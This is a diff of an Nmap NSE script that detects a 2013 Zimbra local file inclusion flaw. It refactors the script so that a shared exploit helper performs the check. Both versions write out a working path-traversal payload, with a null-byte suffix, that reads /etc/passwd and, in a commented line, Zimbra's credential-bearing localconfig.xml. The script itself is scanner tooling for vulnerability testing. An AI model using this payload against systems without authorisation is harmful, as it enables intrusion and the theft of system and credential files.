@@ -3,6 +3,7 @@ local shortport = require "shortport"
 local stdnse = require "stdnse"
 local string = require "string"
 local vulns = require "vulns"
+local exploit = require "exploit"
 
 description = [[
 An 0 day was released on the 6th December 2013 by rubina119, and was patched in Zimbra 7.2.6.
@@ -55,9 +56,6 @@ categories = {"exploit","vuln","intrusive"}
 
 portrule = shortport.http
 
--- function to escape specific characters
-local escape = function(str) return string.gsub(str, "%%", "%%%%") end
-
 action = function(host, port)
   local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/zimbra"
 
@@ -83,36 +81,26 @@ This issue was patched in Zimbra 7.2.6.
        },
      }
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
-
-  local file_short = "../../../../../../../../../dev/null"
-  local file_long = "../../../../../../../../../etc/passwd"
-  --local file_long = "../../../../../../../../../opt/zimbra/conf/localconfig.xml"
-
-  local url_short = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_short .. "%00"
-  local url_long = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_long .. "%00"
+  local payload =  uri .. '/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../..'
+  local file_short = "/dev/null"
+  local file_long = "/etc/passwd"
+  --local file_long = "/opt/zimbra/conf/localconfig.xml"
 
   stdnse.debug1("Trying to detect if the server is vulnerable")
-  stdnse.debug1("GET " .. uri .. escape(url_short))
-  stdnse.debug1("GET " .. uri .. escape(url_long))
 
-  local session_short = http.get(host, port, uri..url_short)
-  local session_long = http.get(host, port, uri..url_long)
+  local status_short, _, contents_short = exploit.lfi_check(host, port, payload, file_short, nil, nil, "%00")
+  local status_long, _, contents_long = exploit.lfi_check(host, port, payload, file_long, nil, nil, "%00")
 
-  if session_short and session_short.status == 200 and session_long and session_long.status == 200 then
-    if session_short.header['content-type'] == "application/x-javascript" then
-      -- Because .gz format is somewhat odd, giving a bit of a margin of error here
-      if (string.len(session_long.body) - string.len(session_short.body)) > 100 then
-        stdnse.debug1("The website appears to be vulnerable a local file inclusion vulnerability in Zimbra")
-        vuln.state = vulns.STATE.EXPLOIT
-        return vuln_report:make_output(vuln)
-      else
-        stdnse.debug1("The host does not appear to be vulnerable")
-        vuln.state = vulns.STATE.NOT_VULN
-        return vuln_report:make_output(vuln)
-      end
+  if status_short and status_long then
+    -- Because .gz format is somewhat odd, giving a bit of a margin of error here
+    if (string.len(contents_long) - string.len(contents_short)) > 100 then
+      stdnse.debug1("The website appears to be vulnerable a local file inclusion vulnerability in Zimbra")
+      vuln.state = vulns.STATE.EXPLOIT
+      return vuln_report:make_output(vuln)
     else
-      stdnse.debug1("Bad content-type for the resource : " .. session_short.header['content-type'])
-      return
+      stdnse.debug1("The host does not appear to be vulnerable")
+      vuln.state = vulns.STATE.NOT_VULN
+      return vuln_report:make_output(vuln)
     end
   else
       stdnse.debug1("The website seems to be not vulnerable to this attack.")
